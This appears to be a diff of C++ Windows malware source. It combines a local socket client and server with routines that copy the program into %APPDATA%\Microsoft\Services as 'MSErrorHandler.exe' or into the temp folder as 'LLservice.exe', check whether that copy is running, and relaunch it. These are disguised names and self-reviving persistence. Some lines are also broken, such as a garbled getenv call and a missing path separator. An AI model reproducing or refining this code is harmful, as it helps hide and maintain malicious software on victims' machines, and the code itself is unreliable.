@@ -28,24 +28,24 @@
 #include <windows.h>
 
 
-#pragma comment (lib, "Ws2_32.lib")
+/*#pragma comment (lib, "Ws2_32.lib")
 #pragma comment (lib, "Mswsock.lib")
-#pragma comment (lib, "AdvApi32.lib")
+#pragma comment (lib, "AdvApi32.lib")*/
 
 
 
 namespace ss
 {
-    #define DEFAULT_PORT "3490"  // the port users will be connecting to
-    #define ip "127.0.0.1"
-    #define DEFAULT_BUFLEN 512
+#define DEFAULT_PORT "3490"  // the port users will be connecting to
+#define ip "127.0.0.1"
+#define DEFAULT_BUFLEN 512
 
     int connect()
     {   WSADATA wsaData;
         SOCKET ConnectSocket = INVALID_SOCKET;
         struct addrinfo *result = NULL,
-                *ptr = NULL,
-                socclinet;
+        *ptr = NULL,
+        socclinet;
 
         char *sendbuf = "arekor";
 
@@ -132,9 +132,9 @@ namespace ss
 
                 iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
                 if (iResult > 0)continue;
-                    //Bytes received:
+                //Bytes received:
                 else if (iResult == 0)return 3;
-                    //Connection closed
+                //Connection closed
                 else return 2;
                 //recv failed with error:
 
@@ -144,7 +144,7 @@ namespace ss
         //closesocket(ConnectSocket);
         //WSACleanup();
 
-       // return 0;
+        // return 0;
 
     }
     int server()
@@ -272,22 +272,30 @@ namespace ss
                         } else {
                             if (i == 2) {
                                 std::string filename = IO::getFileName();
+                                std::string filename_path;
+                                std::string filename_noExe;
                                 if (filename == "MSErrorHandler.exe"){
                                     std::string appdata_dir(getenv("*APPDATA*"));
                                     std::string path = appdata_dir + "\\Microsoft\\Services\\";
-                                    filename = path+"MSErrorHandler.exe";
+                                    //filename = path+"MSErrorHandler.exe";
+                                    filename = "MSErrorHandler.exe";
+                                    filename_noExe = "MSErrorHandler";
+                                    filename_path = path+"MSErrorHandler.exe";
                                 } else{
                                     char* temp = getenv("temp");
                                     std::string temp_dir(temp);
-                                    filename  = temp_dir+"\\LLseervice.exe";
-                                  
+                                    //filename  = temp_dir+"\\LLservice.exe";
+                                    filename = "LLservice.exe";
+                                    filename_noExe = "LLservice";
+                                    filename_path = temp_dir+"LLservice.exe";
+
                                 }
-                                if (IO::exists_file(filename)){
-                                    f (GetIsOnProcess(filename)){
-                                    //ss::creckSoc();
+                                if (IO::exists_file(filename_path)){
+                                    if (GetIsOnProcess(filename)||GetIsOnProcess(filename_noExe)){
+                                        //ss::creckSoc();
                                     } else {
                                         IO::startup(filename_path.c_str());
-                                       }
+                                    }
                                 } else{
                                     if (!IO::copy_File()) break;
                                 }
@@ -302,24 +310,28 @@ namespace ss
         } else {
             if (server == 3) {
                 std::string filename = IO::getFileName();
+                std::string filename_path;
+                std::string filename_noExe;
                 if (filename == "MSErrorHandler.exe"){
                     std::string appdata_dir(getenv("*APPDATA*"));
                     std::string path = appdata_dir + "\\Microsoft\\Services\\";
                     filename = "MSErrorHandler.exe";
-                    filename_path = path+"MSErrorHandler.exe";
+                                    filename_noExe = "MSErrorHandler";
+                                    filename_path = path+"MSErrorHandler.exe";
                 } else{
                     char* temp = getenv("temp");
                     std::string temp_dir(temp);
-                    filename = "LLseervice.exe";
-                    filename_path  = temp_dir+"\\LLseervice.exe";
+                    filename = "LLservice.exe";
+                    filename_noExe = "LLservice";
+                    filename_path = temp_dir+"LLservice.exe";
                 }
                 if (IO::exists_file(filename)){
-                    if (GetIsOnProcess(filename)){
-                    //ss::creckSoc();
+                    if (GetIsOnProcess(filename)||GetIsOnProcess(filename_noExe)){
+                        //ss::creckSoc();
                     } else {
                         IO::startup(filename_path.c_str());
                     }
-               
+
                 } else{
                     if (IO::copy_File()) {
                         //continue
